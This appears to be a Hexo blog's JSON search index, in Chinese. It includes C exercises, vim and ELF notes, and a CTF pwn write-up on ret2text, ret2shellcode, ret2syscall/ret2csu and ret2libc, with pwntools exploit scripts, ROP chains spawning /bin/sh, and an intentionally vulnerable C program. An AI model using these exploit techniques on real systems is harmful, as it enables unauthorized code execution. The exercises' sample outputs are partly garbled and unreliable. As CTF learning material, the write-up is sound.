[{"title":"Hello World","url":"/2024/03/26/hello-world/","content":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub.\nQuick StartCreate a new post$ hexo new &quot;My New Post&quot;\n\nMore info: Writing\nRun server$ hexo server\n\nMore info: Server\nGenerate static files$ hexo generate\n\nMore info: Generating\nDeploy to remote sites$ hexo deploy\n\nMore info: Deployment\n"},{"title":"C语言题目","url":"/2024/03/26/C%E8%AF%AD%E8%A8%80%E9%A2%98%E7%9B%AE/","content":"\n编写一个 C 程序，创建一个整型数组，并通过用户输入初始化数组的元素。然后将数组的每个元素转换为二进制格式并输出。\n\n输入示例:\n51 3 7 15 31\n\n输出示例:\nyaml1: 13: 117: 11115: 111131: 11111\n\n2定义一个名为 IntegerInfo 的结构体，它包含两个成员变量，一个整型变量 num 用于存储整数，另一个字符串 binary 用于存储整数的二进制表示。编写一个函数，接受一个整数作为参数，返回一个 IntegerInfo 结构体，其中的 num 存储输入整数，binary 存储整数的二进制表示。\n输入示例:\n5\n\n输出示例:\nmakefilenum: 5binary: 101\n\n3编写一个 C 程序，定义一个一维整型数组，通过用户输入初始化数组的元素。然后编写一个函数，接受这个数组和一个整数 n 作为参数，返回一个新的数组，其中包含原数组中所有大于 n 的元素的二进制表示。输入示例:\n51 3 7 15 317\n\n输出示例:\nyaml111111111\n\n4定义一个名为 BinaryString 的结构体，包含一个字符串 str 用于存储二进制数字，和一个整型变量 length 用于存储字符串的长度。编写一个函数，ring&#96; 结构体数组中，最后返回这个数组。输入示例:\nHello\n\n输出示例:\nmakefileH: 1001000e: 1100101l: 1101100l: 1101100o: 1101111\n\n5编写一个 C 程序，定义一个结构体数组，每个结构体包含一个整型变量和一个字符串。通过用户输入初始化结构体数组的元素，然后编写一个函数，接受这个结构体数组和一个整数 n 作为参数，返回一个新的数组，其中包含原数组中所有整型变量大于 n 的结构体的字符串的二进制表示。输入示例:\n31 Hello15 World31 Test20\n\n输出示例:\nmakefileWorld: 1010111 1101111 1140100 1100100 1100100Test: 1010100 1100101 1110011 1110100\n\n6编写一个 C 程序，定义一个名为 Array 的结构体，包含两个成员：一个整型指针 data 用于存储数组的元素，一个整型变量 length 用于存储数组的长度。使用动态内存分配创建一个 Array 结构体，并通过用户输入初始化结构体的成员。然后编写一个函数，使用指针操作，翻转数组中的元素，并输出翻转后的数组。输入示例:\n51 3 7 15 31\n\n输出示例:\n31 15 7 3 1\n\n7编写一个 C 程序，定义一个名为 Buffer 的结构体，包含两个成员：一个字符指针 data 用于存储字符串，一个整型变量 length 用于存储字符串的长度。使用动态内存分配创建一个 Buffer 结构体，并通过用户输入初始化结构体的成员。然后编写一个函数，使用指针操作，将字符串中的所有小写字母转为大写字母，并输出转换后的字符串。输入示例:\nhello world\n\n输出示例:\nHELLO WORLD\n\n8编写一个 C 程序，使用指针创建一个二维整型数组，并通过用户输入初始化数组的元素。然后计算并输出数组中所有元素的和。输入示例:\n3 31 2 34 5 67 8 9\n\n输出示例:\n45\n\n\n title: xxx    //在此处添加你的标题。 date: 2016-10-07 13:38:49   //在此处输入编辑这篇文章的时间。 tags: xxx    //在此处输入这篇文章的标签。 categories: xxx    //在此处输入这篇文章的分类。 ---\n\n\n\n","categories":["题目"],"tags":["C语言"]},{"title":"postName","url":"/2024/03/27/postName-1/","content":""},{"title":"pwn 一些题详解","url":"/2024/03/27/wp/","content":"#ret2text\n主要分为32位的和64位的不同程序，在做法是有不同的对应方法与\n在一开始都要先在linux中先确定程序使用了那些保护方式与结构类型\nchecksec 文件名\n![屏幕截图 2023-11-28 173641](wp&#x2F;屏幕截图 2023-11-28 173641-17115444455564.png)\n![屏幕截图 2023-11-28 173737](wp&#x2F;屏幕截图 2023-11-28 173737.png)\n1，无论是32位还是64位都要首先确定栈溢出时要填充多少个垃圾数据，有两种方法，ida和动调\nida（在特定的环境下可能不对以动调的为主）：直接看所要溢出的那个栈在ida上与ebp的距离就是我们一开始要填从的数据的大小，注意在ida上显示的是16进制的数，在写脚本是要转化为10进制的数才能正确，如图要向buf中填充0x12（18）的数据才算覆盖到ebp的位置![屏幕截图 2023-11-27 204046][wp&#x2F;屏幕截图 2023-11-27 204046.png]![屏幕截图 2023-11-27 204046](wp&#x2F;屏幕截图 2023-11-27 204046.png)\n动调：gdb+可执行文件的名称，在运行到输入数据是输入较亮眼的数据，在之后看esp和ebp的距离，是为要注入的数据长。\n现在注入的数据到达ebp所指向的地方但并没用完，由于栈的特点此时我们还需要向其中再注入一段数据用于覆盖ebp所指向的地址，并且这段数据在不同系统中有不同的长度，在64位系统中要输入8个长度的数据，在32位系统中要输如4个长度的数据以上的垃圾数据长度为一个字节（一个大写字母），用如下传递\nb&#x27;A&#x27;*长度的大小\n\n在确定垃圾数据的长度后在注入的数据便是之后程序要跳转执行的地方，在当下的情况下要让程序能执行system(&#x2F;bin&#x2F;sh)以获得控制权，如果在程序中有这个完整的函数，则在垃圾数据之后直接输入该函数的地址跳转到那执行就行，无论是32位还是64位都这样。函数的地址在ida中获得，用如下传递\np32(0x地址数字）用于32位系统p64(0x地址数据)用于64位系统\n\n函数传参在很多情况下程序中并不会直接有system(&#x2F;bin&#x2F;sh)这个函数，而是将这system和&#x2F;bin&#x2F;sh放在不同的地方，需要我们将这两个同过地址的连在一起，用于执行，而此处32为系统与64为系统便是完全不同的方式进行，分开论述。\n32位系统pit在将垃圾数据输入进去之后直接输入到system函所在的地址（切记要输入的是该函数在plt段的地址，不能是text段的地址）此时当程序执行到这里时会直接进入该函数的内部此时我们只要再输入字符串（&#x2F;bin&#x2F;sh）的位置程序便会执行该函数，但在输入字符串之前还要输入一个0\npayload=b&#x27;A&#x27;*垃圾数据的长度+p32(plt段的system的地址)+p32(0)+p32(.data段的/bin/sh的地址)\n关于0的加入：对于本题的函数传参，我们的栈帧构造初步想法如图\nebp\t‘aaaa’r\treturn to func参数一\t“&#x2F;bin&#x2F;sh”输入适量垃圾填充 padding * b ‘a’覆盖返回地址指向func函数 p32(ret_addr)参数”&#x2F;bin&#x2F;sh”地址则payload &#x3D;  padding*b’a’ + p32(ret_addr)  + p32(sh_addr)\n然而这样的脚本在攻击时会出错。原因在于：\n正常的函数调用call来达到push eip；jmp的作用，经过初步payload构造的攻击如下图所示，是通过覆盖return达到jmp的作用的，并没有像call一样push eip到栈中。 故而ret执行后，ebp后为我们输入的参数而非eip原地址（函数结束后返回的地址），而函数读取参数的位置在上文中已经展示，为 ebp+0x8。故而在利用ret2text覆盖pwn题时候，需要自行加入一行栈帧的填充。64位系统在64位的中在将垃圾数据写入之后，我们要将&#x2F;bin&#x2F;sh这段数据先写入到一个寄存器中然后将这个寄存器导入到函数中程序才能·执行于是要做的第一步就是找到一个寄存器并修改其中的值，使用\nROPgadget --binary 文件名 --only &#x27;pop|ret&#x27;\n![屏幕截图 2023-11-28 195354](wp&#x2F;屏幕截图 2023-11-28 195354.png)通过这个我们可以找的程序中可以给我们使用·修改寄存器的命令的地址在这里我们只用传一段函数于是只要用pop rdi；ret一个指令将rdi中的值修改，然后便是在栈中放入‘bin&#x2F;sh’经由pop提交给rdi，最后便是填system的地址（在这里要填入的不能是plt段的system函数的地址，要填的是.data段中的call system的地址，因为在之前将&#x2F;bin&#x2F;sh的地址填入其中从而导入rdi中，如果要rdi中的数据能进入system中则要用call system，将rdi中值导入system然后在执行该函数)\npayload=b&#x27;A&#x27;*垃圾数据的长度+p64(pop|ret的地址)+p64(.data段中的/bin/sh的地址)+p64(.data段中的call system的地址)\n\n#ret2shellcode在这一类题中不会出现system和&#x2F;bin&#x2F;sh这种直接可以用来控制的函数，但程序中有一部分是可读可写可执行的部分，这一部分在程序中是很危险的一部分，一旦出现这种地方，同时含有栈溢出，便可以在通过栈溢出之后使程序跳到那部分可读可写可执行的部分，我们在往里面输入我们shellcode（意为一段恶意程序，通过执行这一段恶意程序，获得控制权）\n关于可读可写可执行段的查找可以在gdb调式程序的过程中用vmmap指令查找![屏幕截图 2023-11-30 143610](wp&#x2F;屏幕截图 2023-11-30 143610.png)如图便可以查找到从0x601000到0x602000是可读可写可执行（一下称为rwx)的程序，我们便可以将shellcode写入到这段程序\n有的时候这个程序不一定在一开始写的时候便有rwx段程序，但在执行时会因为那个指令出现rwx段程序，如\nmprotect(0x601000,0x100,PROT_READ | PROT_WRITE | PROT_EXEC);\n这个指令将0x601000之后的0x100段数据都改为rwx程序于是我们便可以想这段之中写入我们的shellcode，在通过栈溢出使他执行这一段程序。\nshellcode一段恶意程序，可以在pwntools中获得比较简单的一些，执行\nshellcraft.sh()//默认为32位的如果要64位执行下面这个shellcraft.amd64.sh()//\n![屏幕截图 2023-11-30 145900](wp&#x2F;屏幕截图 2023-11-30 145900.png)此时我们获得不过是汇编语言不能直接传入程序中，必须将它换为机器语言传入才能穿入成功\nasm(shellcraft.sh())这样输出的便是机器语言的shellcode，直接传入其中便可以使用\n在64位的是可能会因为其环境默认为32位的而出现问题可以通过如下修改![屏幕截图 2023-11-30 150708](wp&#x2F;屏幕截图 2023-11-30 150708.png)\n例题\n#include&lt;stdio.h&gt;#include&lt;string.h&gt;#include &lt;sys/mman.h&gt; #define _GNU_SOURCE   //gcc poc.c -o poc -no-pie -fno-stack-protectorchar shellcode[100];void initt()\t&#123;\t\tsetvbuf(stdin, 0LL, 1, 0LL);\t\tsetvbuf(stdout, 0LL, 2, 0LL);\t\treturn setvbuf(stderr, 0LL, 1, 0LL);\t&#125;void pwnn()\t&#123;\t\tchar a[10];\t\tputs(&quot;please pwn me!!!&quot;);\t\tread(0,a,0x20);\t&#125;void InputName()\t&#123;\t\tputs(&quot;inputs you name&quot;);\t\tread(0,shellcode,100);\t\tmprotect(0x601000,0x100,PROT_READ | PROT_WRITE | PROT_EXEC);\t&#125;int main()&#123;\tinitt();\tInputName();\tpwnn();&#125;\n在这段程序中先执行InputName函数，在这个函数中，同构read向shellcode中可以输入最长100字节的数据，然后我们会发现他将0x601000之后100的数据改为rwx段，在ida中正好可以看到shellcode段的数据刚好在这其中，我们便可以通过这个向其中输入shellcode，在pwnn这个函数中正好有栈溢出的存在，于是便可以先通过InputName函数输入shellcode然后再pwnn中栈溢出指向shellcode的地址攻击如下\nfrom pwn import *io=process(&quot;./poc&quot;)context.arch = &quot;amd64&quot;//更改环境bss=0x6010A0//shellcode的地址payload=b&#x27;A&#x27;*24+p64(bss)//溢出并指向地址binsh=asm(shellcraft.amd64.sh())构建shellcodeio.send(binsh)//先将shellcode传入rwx段中io.recv()//由于是两段输入中间一个做间隔io.send(payload)//进行栈溢出io.interactive()//交互\n在这一类题中有一个必须注意的事，shellcraft注入的地方最好是bss区，在这题中便是注入到bss区中的，虽然可以注入到栈上但栈上的保护过多最好不要注入到栈中\n#ret2syscall来吧趁今天有点时间把欠了一个星期的博客给补了syscall相当于是一个系统中的命令，可以在与其他寄存器相配合的情况下完成系统调令，在程序没有system和&#x2F;bin&#x2F;sh时使用。在系统中要取得控制权常用的方法是执行system（&#x2F;bin&#x2F;sh）指令，但很多情况下程序是一般不会有这个指令的，此时便可以看是不是可以通过向rwx段注入shellcode来获得控制权，但程序一般也不会有这种地方此时便可以开始考虑ret2syscall的方法，但这种方法夜有很大的局限性，一般只能在静态链接中使用，很少在动态链接中使用，虽然也不是不可以（之后便会讲一题用动态链接的题虽然在一定程度上那题可以算ret2csu的题但本质上还算用syscall可以做的题），\nret2syscall的本质就是让部分寄存器中的值变为特殊值从而使程序执行一个系统调令\nmov eax rax, 0xb 0x3bmov ebx rdi, [“/bin/sh”] mov ecx rsi, 0mov edx rdx, 0int 0x80 syscall=&gt; execve(&quot;/bin/sh&quot;,NULL,NULL)\n\n在静态链接中，在系统内核中的execve(“&#x2F;bin&#x2F;sh”,NULL,NULL)这个函数可以获得控制权，但由于他是内核函数，所以，在调用它时必须满足一些必要的调用约定才可以进行调用，\n像这些系统内核函数调用必须使用一些特殊的汇编指令才能调用，如int 80（32位）和syscall（64位）就像一个call函数，但是是跳转到内核系统中，至于要跳到哪个函数则要根据之前部分寄存器的值来确定，eax(32)和rax(64)保存了系统调用号（内核函数在内核中都有独属于自己一个调用号，如execve的调用号为11（32位&#x3D;0xb）,59（64位&#x3D;0x3b））,ebx和rdi用来保存在函数中执行的参数的地址，同时要保证ecx，edx和rsi，rdx中的值都为0。\n大致就是这个但现在我们要面临的问题是如何修改寄存器中的值，这个有一个很好的方法。可以在终端中运行rop便可以找到程序中的可以帮我们修改寄存器的指令\nROPgadget --binary 文件名 --only &quot;pop|ret&quot;\n![屏幕截图 2023-12-09 160956](wp&#x2F;屏幕截图 2023-12-09 160956.png)\n如此便可以查看在程序中有那些可以供我们去修改寄存器的命令（像这种用于修改寄存器的指令一般被称为gadget），我们只要在栈溢出的垃圾值后面加入这些指令，pop+寄存器的意思是将此时栈上的值取出放入寄存器中，ret的作用是返回栈中，回到我们自己的指令去继续执行我们的指令，而要放入寄存器中的值则只要放在这个指令地址的后面，在程序执行时会将这个指令的后面的那个值作为出栈的数据放入寄存器中。需要注意的是在命令中可能不止一个寄存器，此时我们变要将每一个寄存器的值都改变，便在寄存器命令后面以此放上要放入寄存器的值，如\n0x0000000000405b44 : pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret这是用上面的那个指令运行后出现的一行数据我们的利用p32(0x0000000000405b44)+p32(2)+p32(0)+p32(9)+p32(0x3d)\n如此当被我们劫持的程序执行到这里时，便会依次将2，0，9，0x3d这四个数据分别放入rbx,rbp,r12,r13这四个寄存器中，然后ret会将程序返回到原本的指令中。\n有了以上的分析其实像这种题的过程便可以很清晰的出来了，32位程序：先输入垃圾数据然后，寻找足够的gadget将eax的值改为0xb，ebx改为‘&#x2F;bin&#x2F;sh’的地址（有的程序中会没有这个数据，但可以自己输入，在之后的题便是这种，到时候细讲）ecx改为0，edx改为0。在这4个寄存器的值都改好后便可以执行int 0x80这个指令，获得控制权·64位程序：先输入垃圾数据然后，寻找足够的gadget将rax的值改为0x3b，rbi改为‘&#x2F;bin&#x2F;sh’的地址（有的程序中会没有这个数据，但可以自己输入，在之后的题便是这种，到时候细讲）rsi改为0，rdx改为0。在这4个寄存器的值都改好后便可以执行syscall这个指令，获得控制权·\n如上便是ret2syscall这类题的做法，其实细看回事有很大的限制在其中1，要有足够将4个寄存器都修改的gadget，这一点便基本将动态链接给淘汰了，在大部分的动态链接中是没有足够多的gadget给我们使用的，只用静态链接中才会有足够时的gadget2，在程序中必须有int 0x80（32位程序）或syscall（64位程序）指令\n现在便拿出一道方法用的是ret2syscall但其中用了ret2csu的思想的一道动态链接的64位程序的（神奇）题\n老样子先用checksec查看程序的保护（这道题是学长给的，在一开始题目就是ret2syscall虽然我一度怀疑题目错了，但最后确实没错，在后面为了好输入我改成poc）![屏幕截图 2023-12-09 170220](wp&#x2F;屏幕截图 2023-12-09 170220.png)没什么特别的那就直接开整吧，\n既然是ret2syscall那就找gadget，这里便是我懵逼的第一个地方，如此少的gadget，只能找到修改rdi和rsi的指令器外两个寄存器的值该怎么改？（拿命改），![屏幕截图 2023-12-09 171431](wp&#x2F;屏幕截图 2023-12-09 171431.png)\n先不管将程序放入64位的ida中![屏幕截图 2023-12-09 172045](wp&#x2F;屏幕截图 2023-12-09 172045.png)果然，一看左边这么少的函数就知道是个动态链接的程序，返回到汇编的窗口仔细一找woc居然有syscall指令![屏幕截图 2023-12-09 172639](wp&#x2F;屏幕截图 2023-12-09 172639.png)but在参数一栏找发现没有&#x2F;bin&#x2F;sh![屏幕截图 2023-12-09 172745](wp&#x2F;屏幕截图 2023-12-09 172745.png)这便是我疑惑的第2个地方，后来问了学长才知道，在主程序中有gets函数便可以在劫持程序后利用gets函数将&#x2F;bin&#x2F;sh这个字符串输入到bss段中的空地址中，然后再调用。\n好到现在来总结一下，我们能使用的有syscall命令，rdi和rsi寄存器，用gets函数输入&#x2F;bin&#x2F;sh，如果不考虑ret2libc的话，还差rax和rdx寄存器的改变\n此时一个重要的思想出来，在程序中的__libc_csu_init函数，能有大用，改变某些寄存器的作用这便是ret2csu的思想，将程序导入__libc_csu_init函数中从而改变一些gadget不能改变的寄存器的值![屏幕截图 2023-12-09 192250](wp&#x2F;屏幕截图 2023-12-09 192250.png)在这里便可以先让程序执行0x4012DA地址的指令，修改rbx,rbp,r12,r13,r14,r15寄存器的值，然后在使程序执行0x4012C0地址的指令，从而修改rdx,rsi,edi的值（虽然是edi不是rdi，但是也可以相当于改变rdi，一般用不到前面的位数改变后面的足够了）最后的call可以直接跳转到一个函数出执行（这里有一个大坑，后面慢慢讲)\n到了此时便只差rax的值不能改变，在程序中慢慢找看看能不能找到可以改变的地方![屏幕截图 2023-12-09 194646](wp&#x2F;屏幕截图 2023-12-09 194646.png)好，找到了，在0x40119e及后面的指令在利用后刚好能将edi中的值传输到eax中（在64为系统中主用的是r开头的寄存器，e开头寄存器就是r开头的寄存器的后半部分，大部分情况下，r开头的寄存器前半部分的值用不到的，e的改变足够用），在这里还有一个很重要的点，我们是先将edi的值传进[rbp+var_4]，在将[rbp+var_4]传进eax中，于是我们必须要保证[rbp+var_4]中的值是一个空但有限的地址，在bss段中选择。（var_4在前面有定义，但不用管比较小，只要保证rbp中的地址空并且有效就行)\n由于本题中需要用到的空地址有点多，先讲一下空地址的选择由于我们在调用gets函数需要向空地址写入数据，便要找到一个可写的地址，而bss段便是一个可写的地方，我们可以通过gdb调试中寻找在gdb调试进入程序后输入\nvmmap\n命令便可以看到每一段地址对应的能力，然后在确认好地址后用如下命令查看地址对应的存放情况\nx/20gx 地址名//20代表的是从该地址往后的20字节的地址都显示出来\n![屏幕截图 2023-12-09 201100](wp&#x2F;屏幕截图 2023-12-09 201100.png)如此便可以确认这个地址是一个可写的空的有效的地址\n如此我们便可以将这个题的全部思路写出来，在一开始直接向程序中输入24个垃圾字节数据进行栈溢出，用于劫持程序，然后利用gets函数输入&#x2F;bin&#x2F;sh字符串，在这里会出现一个事情，我们要向一个特定地址输入字符，而gets函数的原型是\nchar *gets(char *str);\n于是在执行gets函数中时便会向先调用rdi寄存器（rdi为最常用的通用寄存器）中的值作为函数输入的值的存放地址，于是我们便要向rdi赋一个空地址，然后才调用gets函数\npayload=b&#x27;A&#x27;*24+p64(pop_rdi_ret)+p64(0x404480)+p64(gets)//get地址为plt段的地址，0x404480空地址\n然后程序便等待输入，输入的过程可以在后面重新开一个新的payload2用于输入数据\n在输入完成后开始对其他寄存器的值开始改变，先改变rax中的值为0x3b，将rdi中的值改变为0x3b，然后将rbp赋值为一个空地址为是程序执行下去，在程序后面还要在加一个空地址用于解决pop rbp指令\npayload+=p64(pop_rdi_ret)+p64(0x3b)+p64(pop_rbp_ret)+p64(0x404680)+p64(edi_eax)+p64(0x404580)//两个地址都是空地址，edi_eax是指令的开始\n\n现在rax的值已经改为0x3b，然后将r12,r13,r14,r15改为&#x2F;bin&#x2F;sh的地址，0,0,call要调转的地方。然后再执行mov的指令\ncall    ds:(__frame_dummy_init_array_entry - 403E10h)[r15+rbx*8]\n这里有一个特殊的地方，call的跳转并不会直接跳转到那个指令的地址，然后执行，而是会将[r15+rbx*8]的地址所存放的地址先读取了，跳转到那个地址然后执行，所以在gets函数输入处不只要&#x2F;bin&#x2F;sh还要syscall指令的地址，然后在让call的调转到gets函数输入的syscall指令的地址，\npayload+=p64(pop_r12_pop_r13_pop_r14_pop_r15_ret)payload+=p64(0x404480)+p64(0)+p64(0)+p64(0x404488)+p64(0x4012C0)//0x4012C0是mov的指令，0x404488是syscall指令地址存放的地址，//0x404480是/bin/sh存放的地址\n第一个payload构造完成开始构造第二个payload2，\npayload2=b&#x27;/bin/sh\\x00&#x27;+p64(syscall)///bin/sh\\x00刚好有8个字节于是再后面syscall的指令，//刚好是放在/bin/sh的地址加8位后，\n好，给出完整的脚本\nfrom pwn import *#context(log_level=&#x27;debug&#x27;)io=process(&quot;./poc&quot;)io.recv()pop_rbp_ret=0x40117dsyscall=0x4011aepop_rsi_pop_r15_ret=0x4012e1pop_rdi_ret=0x4012e3ret=0x40101apop_r13_pop_r14_pop_r15_ret=0x4012desyscall=0x4011aeedi_eax=0x40119Emain=0x401223gets=0x401090getplt=0x404028pop_r12_pop_r13_pop_r14_pop_r15_ret=0x4012dcpayload=b&#x27;A&#x27;*24+p64(pop_rdi_ret)+p64(0x404480)+p64(gets)payload+=p64(pop_rdi_ret)+p64(0x3b)+p64(pop_rbp_ret)+p64(0x404680)+p64(edi_eax)+p64(0x404580)+p64(pop_r12_pop_r13_pop_r14_pop_r15_ret)+p64(0x404480)+p64(0)+p64(0)payload+=p64(0x404488)+p64(0x4012C0)payload2=b&#x27;/bin/sh\\x00&#x27;payload2+=p64(syscall)#gdb.attach(io,&#x27;b *0x4012C0&#x27;) #pause()io.sendline(payload)//第一次传入io.sendline(payload2)第二次传入io.interactive()\n#ret2libc在这里将之间讲述无system和无&#x2F;bin&#x2F;sh的情况将32位与64位分开讲述\n32位在这类题中一般是动态链接很多操作都不能执行更多的知识不多讲直接将做题的过程对于这种题我们一般可以先调用可已打印东西的函数，如puts的函数将got中谋个函数的地址答应出来，根据动态链接的延迟绑定规定，在第一次调用某个函数之后其在动态链接库中的地址将被写入got表中，我们便可以同过put等打印数据的函数将其打印出来地址，这个地址便是该函数在动态链接库中对应的地址，在题中有很大的可能这个地址是一个变化中的地址，这是系统的一种保护操作，但是一般答应出来的后3位（16进制的数）是不会变的，而我们便可以将这后3位的地址用于判断其动态链接库的类型，\nfrom pwn import *from LibcSearcher import LibcSearcher//这个可用于自动寻找库，不过可能有点老，反正我没有用这个成功过io=process(&#x27;./文件名&#x27;)puts_plt=0x00000//puts在plt段的地址，可以直接在ida中找也可以用链接文件后直接用程序找main=0x00000//main函数在text段中的地址，用于在打印地址后返回main从新开始执行libc_start_main=0x000000000//got段中的libc_start_main的地址，在第一次调用后会有真实地址，打印出来payload=b&#x27;A&#x27;*22+p32(put_plt)+p32(main)+p32(libc_start_main)//32位的函数调用特点，间隔一个放参数。io.recvuntil(&quot;\\n&quot;)//可用可不用，关键根据当时的情况来加入，括号内是程序的输出libcaddr=u32(io.recv(4))//用于接收用puts函数打印出来的__libc_start_main函数的真实地址\n在有libc_start_main函数的真实地址后，可以在网上查找函数的偏移地址![屏幕截图 2023-12-09 220543](wp&#x2F;屏幕截图 2023-12-09 220543.png)一般来说真实地址的值会因为保护程序的存在而使中间的地址被随机化，但最后的3位（16进制)不会被改变，便可以通过后3位查到偏移量，程序的基本地址&#x3D;__libc_start_main函数的真实地址-__libc_start_main函数的偏移量system函数的真实地址&#x3D;程序的基本地址+system函数的偏移量str_bin_sh函数的真实地址&#x3D;程序的基本地址+str_bin_sh函数的偏移量\n然后调用system函数利用str_bin_sh函数，便也可以获得控制权，\n__libc_start_main=0x000//__libc_start_main函数的偏移地址system=0x00000//system函数的偏移地址，str_bin_sh=0x000//__libc_start_main函数的偏移地址以上这三个的数值由网上查阅libcbase_addr=libcaddr-__libc_start_mainsystem_addr=libcbase_addr+systembinsh_addr=libcbase_addr+str_bin_shpayload2 = b&#x27;A&#x27;*22 + p32(sys_addr) + b&#x27;AAAA&#x27; + p32(binsh_addr)//这里中间的数为了平衡栈顶要在中间加上4字节的垃圾数据io.sendline(payload2)io.interactive()\n\n如果要使用LibcSearcher来用着要在要在前面加上\nfrom LibcSearcher import *\n\n\n","categories":["CTF"],"tags":["pwn"]},{"title":"pwn基操","url":"/2024/03/27/%E5%8D%9A%E5%AE%A2/","content":"一vim\nvim是我们在使用Linux是经常会使用的工具，新手总是忘记使用方法（当然我也是）。在这里记录下常用命令以防止以后再忘记\n1，进入编辑模式： i （在当前位置插入，开始编辑）；\n2,保存编辑文本： :w (英文冒号，保存当前编辑的文件）；\n3,退出编辑文件： :q（英文冒号，退出当前编辑的文件）；\n4,保存并退出： :wq （英文冒号，保存并退出当前编辑的文件）；\n5.强制退出：  :q! （英文冒号，强制退出不保存）。\n.在vim命令行下输入from\n6,:%!xxd\n\n\n“%!”为调用第三方操作对vim内容进行操作，如 :%!tr a-z A-Z 把全文小写字母改成大写。xxd 命令可以为给定的标准输入或者文件做一次十六进制的输出，它也可以将十六进制输出转换为原来的二进制格式，即将任意文件转换为十六进制或二进制形式。\n\n所以，使用命令之后，会把文档改成十六进制显示。\n7,:%!xxd -r\n\n\nxxd -r 逆向操作:把十六进制转储转换成二进制形式。如果不输出到标准输出,xxd并不把输出文件截断,而是直接写到输出文件。\n\n9,file+文件名，用于识变文件是什么类型的文件，（与文件的后缀无关），同时也通过这个判断是什么文件x32，x64\nwzg@wzg-virtual-machine:~$ file text.ctext.c: C source, ASCII text\n\n10,text.c是一个C语言源代码，ascll编码的文本\n11,rm+文件名，删除那个文件\n12,gcc -S 文件名，可以将文件改为汇编语言文件\n13，checksec +文件名，查看文件是否有保护程序\n![屏幕截图 2023-11-24 205006](C:\\Users\\x\\Pictures\\Screenshots\\Screenshots\\屏幕截图 2023-11-24 205006.png)\nPIE：•程序的防护措施，\n编译时生效，随机化ELF文件的映射地址，\n开启 ASLR 之后，PIE 才会生效。\nNX•程序与操作系统的防护措施，编译时决定是否生效，由操作系统实现，\n通过在内存页的标识中增加“执行”位, 可以表示该内存页是否可以执行, 若程序代码的 EIP 执行至不可运行的内存页, 则 CPU 将直接拒绝执行“指令”造成程序崩溃。\ncanary：•程序的防护措施，编译时生效\n•在刚进入函数时，在栈上放置一个标志canary，在函数返回时检测其是否被改变。以达到防护栈溢出的目的，*.canary长度为1字长，其位置不一-&#x2F;14578定与ebp&#x2F;rbp存储的位置相邻，具体得看程序的汇编操作。\nRELRO：•程序的防护措施，编译时生效\n•部分 RELRO: 在程序装入后, 将其中一些段(如.dynamic)标记为只读, 防止程序的一些重定位信息被修改\n•完全 RELRO: 在部分 RELRO 的基础上, 在程序装入时, 直接解析完所有符号并填入对应的值, 此时所有的 GOT 表项都已初始化, 且不装入link_map与_dl_runtime_resolve的地址。\n![屏幕截图 2023-11-18 193922](C:\\Users\\x\\Pictures\\Screenshots\\Screenshots\\屏幕截图 2023-11-18 193922.png)\n可执行文件\n广义：文件中的数据是可执行代码的文件.out、.exe、.sh、.py\n狭义：文件中的数据是机器码的文件.out、.exe、.dll、.so\n分类：\nWindows：PE（Portable Executable）可执行程序.exe动态链接库.dll静态链接库.lib\nLinux：ELF（Executable and Linkable Format）可执行程序.out动态链接库.so静态链接库.a\n\n•ELF文件头表（ELF header）\n•记录了ELF文件的组织结构\n给系统看\n•\n•程序头表&#x2F;段表（Program header table）\n•告诉系统如何创建进程\n•生成进程的可执行文件必须拥有此结构\n•重定位文件不一定需要\n•\n•节头表（Section header table）&#x2F;&#x2F;用来组织elf文件春村\n•记录了ELF文件的节区信息\n•用于链接的目标文件必须拥有此结构\n其它类型目标文件不一定\n•代码段（Text segment）包含了代码与只读数据\n•.text 节&#x2F;&#x2F;\n•.rodata 节 \n•.hash 节 \n•.dynsym 节 \n•.dynstr 节 \n•.plt 节&#x2F;&#x2F;\n•.rel.got 节 \n•……\n•数据段（Data segment）包含了可读可写数据\n•.data 节 \n•.dynamic 节 \n•.got 节 \n•.got.plt 节&#x2F;&#x2F;用于保存plt节中的代码解析到实际的动态连接的函数的地址\n•.bss 节&#x2F;&#x2F;只在内存中占空间不在磁盘中占有空间\n•……\n•栈段（Stack segment）\n![屏幕截图 2023-11-19 102459](C:\\Users\\x\\Pictures\\Screenshots\\Screenshots\\屏幕截图 2023-11-19 102459.png)\nkemel，内核\nstarck堆栈\nshared libraries，共享库\nheap堆，动态存储区，malloc在程序执行后才有的空间在其中\nunused未使用 \ntext代码段：main函数，sum函数，具体实现的机械码都放在其中，会有一些不可写的代码\ndata段会存放已初始化的全局变量，str\nbss段存放未初始化的全局变量，glb（不占用内存空间）\n![屏幕截图 2023-11-19 105211](C:\\Users\\x\\Pictures\\Screenshots\\Screenshots\\屏幕截图 2023-11-19 105211.png)\n小端序：数据从左往右，存的时候从下到上\n​     \n•RIP\n•存放当前执行的指令的地址\n•RSP\n•存放当前栈帧的栈顶地址\n•RBP\n•存放当前栈帧的栈底地址\n•RAX\n•通用寄存器。存放函数返回值\n栈（stack）：地址从高地址往低地址增长（从上往下），\n堆（heap）：地址从低地址往高地址增长（从下往上），\n在栈和堆中有shared libraries（共享库），且大小为止，通过两者不同的增长方向使其充分利用空间\n ![屏幕截图 2023-11-19 114829](C:\\Users\\x\\Pictures\\Screenshots\\Screenshots\\屏幕截图 2023-11-19 114829.png)\nhigh address高地址；caller’s Function state函数功能状态;stack top顶端;low address低地址\n![屏幕截图 2023-11-19 120035](C:\\Users\\x\\Pictures\\Screenshots\\Screenshots\\屏幕截图 2023-11-19 120035.png)\n•函数状态主要涉及三个寄存器 —— esp，ebp，eip。esp 用来存储函数调用栈的栈顶地址，在压栈和退栈时发生变化。\nebp 用来存储当前函数状态的基地址，在函数运行时不变，可以用来索引确定函数参数或局部变量的位置。\neip 用来存储即将执行的程序指令的地址，cpu 依照 eip 的存储内容读取指令并执行，eip 随之指向相邻的下一条指令，如此反复，程序就得以连续执行指令。\n•下面让我们来看看发生函数调用时，栈顶函数状态以及上述寄存器的变化。变化的核心任务是将调用函数（caller）的状态保存起来，同时创建被调用函数（callee）的状态。\n•首先将被调用函数（callee）的参数按照逆序依次压入栈内。如果被调用函数（callee）不需要参数，则没有这一步骤。这些参数仍会保存在调用函数（caller）的函数状态内，之后压入栈内的数据都会作为被调用函数（callee）的函数状态来保存。\n![image-20231119143141350](博客&#x2F;屏幕截图 2023-11-19 120035-17115442857899-171154428701611-171154428884713-171154429006215.png)\n​                                    将被调用函数的参数压入栈内\nhigh address高地址；low address低地址；return address回信地址；stack top顶端；caller访客；\nfunction state功能状态;\n（1）esp：栈指针寄存器(extended stack 